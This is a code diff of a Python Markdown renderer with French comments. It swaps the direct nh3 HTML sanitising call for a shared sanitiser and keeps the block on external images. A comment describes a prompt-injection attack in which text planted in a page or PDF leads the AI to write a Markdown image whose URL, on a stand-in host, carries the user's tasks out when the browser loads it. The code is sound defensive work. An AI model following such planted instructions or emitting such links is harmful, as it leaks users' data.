@@ -6,10 +6,10 @@ import re
 import secrets
 
 import markdown as md
-import nh3
 from markupsafe import Markup, escape
 
-from ..securite import ExternalImages, media_filter
+from ..nettoyage_html import nettoyer
+from ..securite import ExternalImages
 
 _CODE_RE = re.compile(r"(```.*?(?:```|$)|`[^`\n]+`)", re.S)
 _MATH_RE = re.compile(r"(\$\$.+?\$\$|\\\[.+?\\\]|\\\(.+?\\\)|(?<![\\$\w])\$(?!\s)[^$\n]+?(?<!\s)\$(?![\w$]))", re.S)
@@ -42,9 +42,9 @@ def render(text: str | None) -> Markup:
     attrs = {k: set(v) for k, v in ALLOWED_ATTRS.items()}
     attrs.setdefault("pre", set())
     # Aucune image externe : une consigne glissée dans une page ou un PDF pourrait faire écrire à l'IA
-    # ![ok](https://site/?d=<tes tâches>), que le navigateur chargerait sans clic (fuite de données).
-    clean = nh3.clean(html, tags=set(ALLOWED_TAGS) | {"pre"}, attributes=attrs, attribute_filter=media_filter,
-                      url_schemes={"http", "https", "mailto"}, link_rel="noopener noreferrer")
+    # ![ok](https://site/?d=<tes tâches>), que le navigateur chargerait sans clic (fuite de données). Règle
+    # commune à tout Hangar (nettoyage_html).
+    clean = nettoyer(html, set(ALLOWED_TAGS) | {"pre"}, attrs)
     clean = re.sub(rf"{token}x(\d+)x", lambda m: str(escape(maths[int(m.group(1))])), clean)
     return Markup(clean)
 
